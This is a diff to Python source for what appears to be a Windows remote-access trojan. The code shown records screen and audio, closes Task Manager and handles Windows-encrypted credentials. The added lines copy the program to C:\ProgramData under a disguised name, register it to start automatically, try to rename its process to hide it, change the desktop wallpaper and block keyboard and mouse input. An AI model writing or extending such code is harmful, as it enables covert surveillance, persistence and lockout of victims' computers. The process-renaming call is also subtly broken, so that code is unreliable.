@@ -14,12 +14,15 @@ import shutil
 import sqlite3
 import base64
 import win32crypt
+import ctypes
 import cv2
 from aiofiles import open as aio_open
 import time
 import mss
 import numpy as np
 import pyaudio
+import keyboard
+import mouse
 import wave
 
 async def self_delete():
@@ -103,34 +106,46 @@ async def record_screen_and_audio(duration):
     return video_filename, audio_filename
 
 async def copy_and_run():
-    """COPY TO ANOTHER DIRECTORY AND RESTART FROM THERE"""
-    exe_name = os.path.basename(sys.executable)
-    new_dir = r"C:\ProgramData"#copy to here
+    """COPY TO ANOTHER DIRECTORY AND RESTART FROM THERE WITH NEW NAME"""
+    exe_name = "localhost.exe"  
+    new_dir = r"C:\ProgramData"
     new_path = os.path.join(new_dir, exe_name)
 
     if not os.path.exists(new_path):
         try:
             shutil.copy(sys.executable, new_path)
-        except Exception as e:
+        except Exception:
             return False
 
     """ADD TO AUTOLOAD"""
     reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, "Java Update Checker", 0, winreg.REG_SZ, new_path)
-    except Exception as e:
+            winreg.SetValueEx(key, "localhost", 0, winreg.REG_SZ, new_path)
+    except Exception:
         return False
 
+    """RESTART WITH NEW NAME"""
     if sys.executable != new_path:
         try:
             subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
             await asyncio.sleep(1)
             sys.exit()
-        except Exception as e:
+        except Exception:
             return False
 
+    """RENAME PROCESS"""
+    await rename_process("localhost")
+
     return True
+
+async def rename_process(new_name):
+    """RENAME PROCESS IN TASK MANAGER"""
+    try:
+        proc = psutil.Process(os.getpid())
+        proc.name(new_name)
+    except Exception:
+        pass
 
 async def close_taskmgr():
     """CLOSE TASK MANAGER(US IF YOU WANT)"""
@@ -359,6 +374,34 @@ async def record_video(later):
 
     return video_filename
 
+def set_wallpaper(image_path):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, image_path)
+        key.Close()
+    
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+        return 'wallper hes changed!'
+    except Exception as e:
+        return f'error {e}'
+    
+async def block_input(value): 
+    mouse.move(100, 100, absolute=True, duration=0.1)
+    keyboard.block_key('esc')
+    keyboard.block_key('win')
+    keyboard.block_key('delete')
+    keyboard.block_key('alt')
+    keyboard.block_key('ctrl')
+    keyboard.block_key('tab')
+    keyboard.block_key('f1')
+    keyboard.block_key('f2')
+    keyboard.block_key('f3')
+    keyboard.block_key('f4')
+
+async def unblock():
+    await block_input(False)
+    keyboard.unhook_all()
+    mouse.unhook_all()
 
 async def main_cycle():
     await copy_and_run()
